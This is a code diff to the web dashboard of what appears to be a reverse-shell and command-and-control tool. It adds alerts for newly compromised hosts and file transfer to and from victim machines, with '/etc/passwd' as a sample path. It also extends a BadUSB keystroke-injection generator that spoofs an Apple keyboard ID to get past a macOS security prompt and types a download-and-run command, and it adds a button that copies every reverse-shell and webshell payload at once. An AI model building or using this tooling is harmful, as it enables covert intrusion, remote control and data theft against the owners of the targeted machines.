@@ -52,12 +52,23 @@ const app = state({
   badUsbOs: "linux",
   badUsbArch: "amd64",
   badUsbTags: "",
+  badUsbVid: "",
+  badUsbPid: "",
+  badUsbDelay: 1000,
   badUsbLoader: true,
   badUsbCopied: false,
   logEntries: [],
   logWs: null,
   payloadsOpen: false,
+  payloadsCopiedAll: false,
   csrfTokenValue: "",
+  helpOpen: false,
+  lastUserActionAt: 0, // used to suppress self-triggered notifications
+  fileTransfers: {}, // hostId -> { transferId -> { kind, path, progress, total, error, done } }
+  hostUploadPath: {},
+  hostDownloadPath: {},
+  sidebarWidth: null,
+  logHeight: null,
 });
 
 const current = () => app.sessions.find((s) => s.id === app.currentId) || null;
@@ -81,6 +92,48 @@ async function loadCsrfToken() {
   if (!app.csrfTokenValue && location.pathname !== "/login") {
     location.href = "/login";
   }
+}
+
+// --- Browser notifications --------------------------------------------------
+// Ask once on boot (no-op if denied or unsupported). Notifications are only
+// shown when the dashboard tab is hidden, and suppressed for ~1 s after a user
+// action that is expected to create a host/session (e.g. opening a host shell).
+function requestNotificationPermission() {
+  if (!("Notification" in window)) return;
+  if (Notification.permission === "default") {
+    Notification.requestPermission().catch(() => {});
+  }
+}
+
+function notifySession(session) {
+  if (!("Notification" in window)) return;
+  if (Notification.permission !== "granted") return;
+  if (!document.hidden) return;
+  if (Date.now() - app.lastUserActionAt < 1000) return;
+  const n = new Notification("New session", {
+    body: `${session.remote} · ${session.transport}`,
+    tag: `session:${session.id}`,
+  });
+  n.onclick = () => {
+    window.focus();
+    selectSession(session.id);
+  };
+}
+
+function notifyHost(host) {
+  if (!("Notification" in window)) return;
+  if (Notification.permission !== "granted") return;
+  if (!document.hidden) return;
+  if (Date.now() - app.lastUserActionAt < 1000) return;
+  const title = host.label || host.hostname || host.remote;
+  const n = new Notification("New host", {
+    body: `${title} · ${host.username || "?"}@${host.os}/${host.arch}`,
+    tag: `host:${host.id}`,
+  });
+  n.onclick = () => {
+    window.focus();
+    openHostDetails(host.id);
+  };
 }
 
 const hostMatches = (h) => {
@@ -158,6 +211,13 @@ function closePayloads() {
   app.payloadsOpen = false;
 }
 
+function openHelp() {
+  app.helpOpen = true;
+}
+function closeHelp() {
+  app.helpOpen = false;
+}
+
 function paletteRunSelected() {
   const items = paletteItems();
   const it = items[app.paletteIndex];
@@ -173,6 +233,16 @@ function paletteMove(delta) {
   app.paletteIndex = (app.paletteIndex + delta + items.length) % items.length;
 }
 
+function isTypingTarget(e) {
+  const tag = e.target && e.target.tagName;
+  return (
+    tag === "INPUT" ||
+    tag === "TEXTAREA" ||
+    tag === "SELECT" ||
+    (e.target && e.target.isContentEditable)
+  );
+}
+
 window.addEventListener("keydown", (e) => {
   if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
     e.preventDefault();
@@ -180,11 +250,25 @@ window.addEventListener("keydown", (e) => {
     else openPalette();
     return;
   }
-  if (!app.paletteOpen) return;
   if (e.key === "Escape") {
+    if (app.helpOpen) {
+      e.preventDefault();
+      closeHelp();
+      return;
+    }
+    if (app.paletteOpen) {
+      e.preventDefault();
+      closePalette();
+      return;
+    }
+  }
+  if (e.key === "?" && !isTypingTarget(e) && !app.paletteOpen && !app.modal && !app.hostDetailsId) {
     e.preventDefault();
-    closePalette();
-  } else if (e.key === "ArrowDown") {
+    openHelp();
+    return;
+  }
+  if (!app.paletteOpen) return;
+  if (e.key === "ArrowDown") {
     e.preventDefault();
     paletteMove(1);
   } else if (e.key === "ArrowUp") {
@@ -350,6 +434,198 @@ async function clearDeadSessions() {
   await apiPost("/api/sessions/clear-dead");
 }
 
+async function downloadScrollback(id) {
+  try {
+    const res = await fetch(`/api/sessions/${id}/scrollback`, { credentials: "same-origin" });
+    if (!res.ok) {
+      console.error("Scrollback download failed:", res.status);
+      return;
+    }
+    const blob = await res.blob();
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `scrollback-${id}.bin`;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    URL.revokeObjectURL(url);
+  } catch (e) {
+    console.error("Scrollback download error:", e);
+  }
+}
+
+// --- Host file transfer (dashboard side) ------------------------------------
+const FILE_CHUNK_SIZE = 16 * 1024;
+
+function ensureFileTransfers(hostId) {
+  if (!app.fileTransfers[hostId]) {
+    app.fileTransfers[hostId] = {};
+  }
+  return app.fileTransfers[hostId];
+}
+
+function setTransfer(hostId, transferId, patch) {
+  const map = ensureFileTransfers(hostId);
+  map[transferId] = { ...(map[transferId] || {}), ...patch };
+  app.fileTransfers = { ...app.fileTransfers };
+}
+
+function removeTransfer(hostId, transferId) {
+  const map = ensureFileTransfers(hostId);
+  delete map[transferId];
+  app.fileTransfers = { ...app.fileTransfers };
+}
+
+function connectFileSocket(hostId, onMessage) {
+  const ws = new WebSocket(wsUrl("/api/ws/host/" + hostId + "/file"));
+  ws.onmessage = (ev) => {
+    let msg;
+    try {
+      msg = JSON.parse(ev.data);
+    } catch {
+      return;
+    }
+    onMessage(msg);
+  };
+  return ws;
+}
+
+function fileTransferName(path) {
+  if (!path) return "unnamed";
+  const i = path.lastIndexOf("/");
+  return i >= 0 ? path.slice(i + 1) : path;
+}
+
+async function uploadFileToHost(hostId, file, remotePath) {
+  const transferId = Math.floor(Math.random() * 0x7fffffff);
+  setTransfer(hostId, transferId, {
+    kind: "upload",
+    path: remotePath,
+    name: file.name,
+    progress: 0,
+    total: file.size,
+    error: "",
+    done: false,
+  });
+
+  const ws = connectFileSocket(hostId, (msg) => {
+    if (msg.transfer_id !== transferId) return;
+    if (msg.type === "file_done") {
+      setTransfer(hostId, transferId, {
+        done: true,
+        error: msg.error || "",
+      });
+      setTimeout(() => removeTransfer(hostId, transferId), 4000);
+      ws.close();
+    }
+  });
+
+  ws.onopen = async () => {
+    ws.send(JSON.stringify({
+      type: "file_start",
+      transfer_id: transferId,
+      path: remotePath,
+      size: file.size,
+    }));
+
+    const reader = new FileReader();
+    for (let offset = 0; offset < file.size; offset += FILE_CHUNK_SIZE) {
+      const slice = file.slice(offset, offset + FILE_CHUNK_SIZE);
+      const data = await new Promise((resolve, reject) => {
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = reject;
+        reader.readAsArrayBuffer(slice);
+      });
+      const b64 = arrayBufferToBase64(data);
+      ws.send(JSON.stringify({
+        type: "file_chunk",
+        transfer_id: transferId,
+        data: b64,
+      }));
+      setTransfer(hostId, transferId, { progress: offset + slice.size });
+    }
+
+    ws.send(JSON.stringify({
+      type: "file_done",
+      transfer_id: transferId,
+      error: "",
+    }));
+  };
+}
+
+function arrayBufferToBase64(buf) {
+  const bytes = new Uint8Array(buf);
+  let binary = "";
+  for (let i = 0; i < bytes.byteLength; i++) {
+    binary += String.fromCharCode(bytes[i]);
+  }
+  return window.btoa(binary);
+}
+
+function downloadFileFromHost(hostId, remotePath) {
+  const transferId = Math.floor(Math.random() * 0x7fffffff);
+  const name = fileTransferName(remotePath);
+  const chunks = [];
+  let total = 0;
+
+  setTransfer(hostId, transferId, {
+    kind: "download",
+    path: remotePath,
+    name,
+    progress: 0,
+    total: 0,
+    error: "",
+    done: false,
+  });
+
+  const ws = connectFileSocket(hostId, (msg) => {
+    if (msg.transfer_id !== transferId) return;
+    if (msg.type === "file_start") {
+      total = msg.size || 0;
+      setTransfer(hostId, transferId, { total });
+    } else if (msg.type === "file_chunk") {
+      const bytes = base64ToArrayBuffer(msg.data || "");
+      chunks.push(bytes);
+      setTransfer(hostId, transferId, { progress: chunks.reduce((s, c) => s + c.byteLength, 0) });
+    } else if (msg.type === "file_done") {
+      if (msg.error) {
+        setTransfer(hostId, transferId, { done: true, error: msg.error });
+      } else {
+        const blob = new Blob(chunks);
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = name;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        URL.revokeObjectURL(url);
+        setTransfer(hostId, transferId, { done: true, progress: total });
+      }
+      setTimeout(() => removeTransfer(hostId, transferId), 4000);
+      ws.close();
+    }
+  });
+
+  ws.onopen = () => {
+    ws.send(JSON.stringify({
+      type: "file_request",
+      transfer_id: transferId,
+      path: remotePath,
+    }));
+  };
+}
+
+function base64ToArrayBuffer(str) {
+  const binary = window.atob(str);
+  const bytes = new Uint8Array(binary.length);
+  for (let i = 0; i < binary.length; i++) {
+    bytes[i] = binary.charCodeAt(i);
+  }
+  return bytes.buffer;
+}
+
 function upgradeCurrent() {
   const c = current();
   if (!c) return;
@@ -365,6 +641,7 @@ function upgradeCurrent() {
 async function openHostShell(hostId) {
   const host = app.hosts.find((h) => h.id === hostId);
   if (!host || !host.alive) return;
+  app.lastUserActionAt = Date.now();
   const cols = termCtl.term?.cols || 80;
   const rows = termCtl.term?.rows || 24;
   await apiPost(`/api/hosts/${hostId}/shells`, { cols, rows });
@@ -471,11 +748,32 @@ function badUsbShortUrl() {
   return `${proto}${host}/dl/s?${new URLSearchParams(q)}`;
 }
 
+function normalizeHexId(raw) {
+  if (!raw) return "";
+  const s = raw.trim();
+  const m = s.match(/^(0x)?([0-9a-fA-F]{1,4})$/);
+  if (!m) return "";
+  return "0x" + m[2].toLowerCase();
+}
+
 function badUsbScript() {
   const useLoader = app.badUsbLoader;
   const url = useLoader ? badUsbShortUrl() : badUsbDownloadUrl();
   const os = app.badUsbOs || "linux";
+  const isMac = os === "darwin" || os === "macos";
+  // macOS presents the Keyboard Setup Assistant for unknown HID keyboards.
+  // Spoofing an Apple keyboard (VID 0x05ac / PID 0x0281) bypasses that prompt.
+  let vid = normalizeHexId(app.badUsbVid);
+  let pid = normalizeHexId(app.badUsbPid);
+  if (isMac && !vid && !pid) {
+    vid = "0x05ac";
+    pid = "0x0281";
+  }
+  const delay = Math.max(0, parseInt(app.badUsbDelay, 10) || 0);
   const lines = [];
+  if (vid) lines.push("VID " + vid);
+  if (pid) lines.push("PID " + pid);
+  if (delay > 0) lines.push("DELAY " + delay);
   if (os === "windows" || os === "win") {
     lines.push("GUI r");
     lines.push("DELAY 500");
@@ -539,6 +837,7 @@ function connectSessionsStream() {
       app.hosts = m.hosts || [];
     } else if (m.type === "add") {
       app.sessions = [...app.sessions.filter((s) => s.id !== m.session.id), m.session];
+      notifySession(m.session);
     } else if (m.type === "update") {
       app.sessions = app.sessions.map((s) => (s.id === m.session.id ? m.session : s));
     } else if (m.type === "remove") {
@@ -549,6 +848,7 @@ function connectSessionsStream() {
       }
     } else if (m.type === "host_add") {
       app.hosts = [...app.hosts.filter((h) => h.id !== m.host.id), m.host];
+      notifyHost(m.host);
     } else if (m.type === "host_update") {
       app.hosts = app.hosts.map((h) => (h.id === m.host.id ? m.host : h));
     } else if (m.type === "host_remove") {
@@ -819,6 +1119,40 @@ const BadUsbModal = () =>
           ),
           el(
             "label",
+            { class: "field" },
+            el("span", {}, "USB VID (optional, e.g. 0x1234)"),
+            el("input", {
+              type: "text",
+              placeholder: "0x1234",
+              value: () => app.badUsbVid,
+              oninput: (e) => (app.badUsbVid = e.target.value),
+            })
+          ),
+          el(
+            "label",
+            { class: "field" },
+            el("span", {}, "USB PID (optional, e.g. 0x5678)"),
+            el("input", {
+              type: "text",
+              placeholder: "0x5678",
+              value: () => app.badUsbPid,
+              oninput: (e) => (app.badUsbPid = e.target.value),
+            })
+          ),
+          el(
+            "label",
+            { class: "field" },
+            el("span", {}, "Initial delay (ms)"),
+            el("input", {
+              type: "number",
+              min: 0,
+              step: 100,
+              value: () => app.badUsbDelay,
+              oninput: (e) => (app.badUsbDelay = e.target.value),
+            })
+          ),
+          el(
+            "label",
             { class: "field checkbox" },
             el("input", {
               type: "checkbox",
@@ -881,10 +1215,34 @@ chmod +x /tmp/rsl
             "Copy"
           )
         );
+      const allPayloads =
+        `# Raw TCP\n${tcpPayload}\n\n` +
+        `# TLS\n${tlsPayload}\n\n` +
+        `# HTTP webshell\n${webPayload}\n\n` +
+        `# Mux / Go client\n${muxPayload}\n\n` +
+        `# Mux / download & run\n${muxDownloadPayload}`;
+      const copyAll = async () => {
+        try {
+          await navigator.clipboard.writeText(allPayloads);
+          app.payloadsCopiedAll = true;
+          setTimeout(() => (app.payloadsCopiedAll = false), 1500);
+        } catch {
+          /* ignore */
+        }
+      };
       return ModalShell({
         title: "Payloads",
         onClose: closePayloads,
         children: [
+          el(
+            "div",
+            { class: "modal-actions" },
+            el(
+              "button",
+              { class: "btn", onclick: copyAll },
+              () => (app.payloadsCopiedAll ? "Copied all!" : "Copy all")
+            )
+          ),
           block("Raw TCP", tcpPayload),
           block("TLS", tlsPayload),
           block("HTTP webshell", webPayload),
@@ -991,6 +1349,7 @@ const HostDetails = () =>
               )
             )
           ),
+          FileTransferPanel(h),
           el(
             "div",
             { class: "host-details-actions" },
@@ -1011,6 +1370,106 @@ const HostDetails = () =>
       );
     }
   );
+
+const FileTransferPanel = (h) => {
+  const hostTransfers = app.fileTransfers[h.id] || {};
+  const transfers = Object.values(hostTransfers);
+  const uploadPath = () => app.hostUploadPath[h.id] || "";
+  const downloadPath = () => app.hostDownloadPath[h.id] || "";
+  const setUploadPath = (v) => {
+    app.hostUploadPath = { ...app.hostUploadPath, [h.id]: v };
+  };
+  const setDownloadPath = (v) => {
+    app.hostDownloadPath = { ...app.hostDownloadPath, [h.id]: v };
+  };
+  return el(
+    "div",
+    { class: "file-transfer" },
+    el("div", { class: "list-group-label" }, el("span", {}, "Files")),
+    when(
+      () => !h.alive,
+      () => el("div", { class: "empty" }, "Host is offline")
+    ),
+    when(
+      () => h.alive,
+      () =>
+        el(
+          "div",
+          { class: "file-actions" },
+          el(
+            "label",
+            { class: "field" },
+            el("span", {}, "Upload to host"),
+            el("input", {
+              type: "text",
+              placeholder: "/tmp/file.bin",
+              value: uploadPath,
+              oninput: (e) => setUploadPath(e.target.value),
+            })
+          ),
+          el(
+            "button",
+            {
+              class: "btn micro",
+              disabled: () => !uploadPath(),
+              onclick: () => {
+                const input = document.createElement("input");
+                input.type = "file";
+                input.onchange = () => {
+                  const file = input.files && input.files[0];
+                  const p = uploadPath();
+                  if (file && p) uploadFileToHost(h.id, file, p);
+                };
+                input.click();
+              },
+            },
+            "Choose file"
+          ),
+          el(
+            "label",
+            { class: "field" },
+            el("span", {}, "Download from host"),
+            el("input", {
+              type: "text",
+              placeholder: "/etc/passwd",
+              value: downloadPath,
+              oninput: (e) => setDownloadPath(e.target.value),
+            })
+          ),
+          el(
+            "button",
+            {
+              class: "btn micro",
+              disabled: () => !downloadPath(),
+              onclick: () => downloadFileFromHost(h.id, downloadPath()),
+            },
+            "Download"
+          )
+        )
+    ),
+    when(
+      () => transfers.length > 0,
+      () =>
+        el(
+          "div",
+          { class: "file-transfers" },
+          ...transfers.map((t) =>
+            el(
+              "div",
+              { class: "file-transfer-row" + (t.error ? " error" : t.done ? " done" : "") },
+              el("span", { class: "file-name" }, t.name || t.path),
+              el("span", { class: "file-status" },
+                t.error ? `error: ${t.error}` :
+                t.done ? "done" :
+                t.total ? `${Math.round((t.progress / t.total) * 100)}%` :
+                `${t.progress} bytes`
+              )
+            )
+          )
+        )
+    )
+  );
+};
 
 const kv = (k, v) =>
   el(
@@ -1112,10 +1571,47 @@ const CommandPalette = () =>
     }
   );
 
+const HelpModal = () =>
+  when(
+    () => app.helpOpen,
+    () =>
+      ModalShell({
+        title: "Keyboard shortcuts",
+        onClose: closeHelp,
+        children: [
+          el(
+            "div",
+            { class: "shortcut-grid" },
+            el("div", { class: "shortcut-key" }, "?"),
+            el("div", { class: "shortcut-desc" }, "Show this help"),
+            el("div", { class: "shortcut-key" }, "Ctrl / Cmd + K"),
+            el("div", { class: "shortcut-desc" }, "Open command palette"),
+            el("div", { class: "shortcut-key" }, "↑ / ↓"),
+            el("div", { class: "shortcut-desc" }, "Navigate palette / lists"),
+            el("div", { class: "shortcut-key" }, "Enter"),
+            el("div", { class: "shortcut-desc" }, "Open selected item"),
+            el("div", { class: "shortcut-key" }, "Esc"),
+            el("div", { class: "shortcut-desc" }, "Close palette, help, or overlay"),
+            el("div", { class: "shortcut-key" }, "Drag sidebar edge"),
+            el("div", { class: "shortcut-desc" }, "Resize sidebar"),
+            el("div", { class: "shortcut-key" }, "Drag log panel edge"),
+            el("div", { class: "shortcut-desc" }, "Resize event log")
+          ),
+        ],
+      })
+  );
+
 const LogPanel = () =>
   el(
     "div",
     { class: "log-panel" },
+    el("div", {
+      class: "log-resizer",
+      onmousedown: (e) => {
+        e.preventDefault();
+        startLogDrag(e);
+      },
+    }),
     el(
       "div",
       { class: "list-group-label" },
@@ -1240,7 +1736,14 @@ const Sidebar = () =>
         },
         "Payloads"
       )
-    )
+    ),
+    el("div", {
+      class: "sidebar-resizer",
+      onmousedown: (e) => {
+        e.preventDefault();
+        startSidebarDrag(e);
+      },
+    })
   );
 
 const Hamburger = () =>
@@ -1310,6 +1813,19 @@ const Toolbar = () =>
       "button",
       {
         class: "btn",
+        disabled: () => !current(),
+        onclick: () => {
+          const c = current();
+          if (c) downloadScrollback(c.id);
+        },
+        title: "Download session scrollback",
+      },
+      "Download"
+    ),
+    el(
+      "button",
+      {
+        class: "btn",
         disabled: () =>
           !current() ||
           !current().alive ||
@@ -1364,12 +1880,84 @@ const SidebarBackdrop = () =>
     ""
   );
 
+// --- Resizable panels -------------------------------------------------------
+const SIDEBAR_MIN = 200;
+const SIDEBAR_MAX_PCT = 0.5; // 50vw
+const LOG_PANEL_MIN = 120;
+const LOG_PANEL_MAX_PCT = 0.6; // 60vh
+
+function setSidebarWidth(px) {
+  const max = Math.floor(window.innerWidth * SIDEBAR_MAX_PCT);
+  const clamped = Math.max(SIDEBAR_MIN, Math.min(max, px));
+  document.documentElement.style.setProperty("--sidebar-width", `${clamped}px`);
+  app.sidebarWidth = clamped;
+  localStorage.setItem("rsl.sidebarWidth", String(clamped));
+}
+
+function setLogHeight(px) {
+  const max = Math.floor(window.innerHeight * LOG_PANEL_MAX_PCT);
+  const clamped = Math.max(LOG_PANEL_MIN, Math.min(max, px));
+  document.documentElement.style.setProperty("--log-height", `${clamped}px`);
+  app.logHeight = clamped;
+  localStorage.setItem("rsl.logHeight", String(clamped));
+}
+
+function initResizablePanels() {
+  const savedWidth = localStorage.getItem("rsl.sidebarWidth");
+  const savedHeight = localStorage.getItem("rsl.logHeight");
+  if (savedWidth) setSidebarWidth(parseInt(savedWidth, 10));
+  if (savedHeight) setLogHeight(parseInt(savedHeight, 10));
+}
+
+function startSidebarDrag(e) {
+  const startX = e.clientX;
+  const startWidth = app.sidebarWidth || 288;
+  const handle = e.target;
+  handle.classList.add("dragging");
+
+  function onMove(ev) {
+    const delta = ev.clientX - startX;
+    setSidebarWidth(startWidth + delta);
+  }
+
+  function onUp() {
+    handle.classList.remove("dragging");
+    document.removeEventListener("mousemove", onMove);
+    document.removeEventListener("mouseup", onUp);
+  }
+
+  document.addEventListener("mousemove", onMove);
+  document.addEventListener("mouseup", onUp);
+}
+
+function startLogDrag(e) {
+  const startY = e.clientY;
+  const startHeight = app.logHeight || 220;
+  const handle = e.target;
+  handle.classList.add("dragging");
+  // Log panel is at the bottom of the sidebar; dragging up grows the panel.
+  function onMove(ev) {
+    const delta = startY - ev.clientY;
+    setLogHeight(startHeight + delta);
+  }
+
+  function onUp() {
+    handle.classList.remove("dragging");
+    document.removeEventListener("mousemove", onMove);
+    document.removeEventListener("mouseup", onUp);
+  }
+
+  document.addEventListener("mousemove", onMove);
+  document.addEventListener("mouseup", onUp);
+}
+
 // --- Boot ------------------------------------------------------------------
 mount(document.getElementById("app"), () =>
-  el("div", { class: "app" }, Sidebar(), SidebarBackdrop(), Main(), HostDetails(), CommandPalette(), BuildModal(), BadUsbModal(), PayloadsModal())
+  el("div", { class: "app" }, Sidebar(), SidebarBackdrop(), Main(), HostDetails(), CommandPalette(), HelpModal(), BuildModal(), BadUsbModal(), PayloadsModal())
 );
 
 connectSessionsStream();
 connectLogStream();
 loadBuildTargets();
-loadCsrfToken();
+initResizablePanels();
+loadCsrfToken().then(requestNotificationPermission);
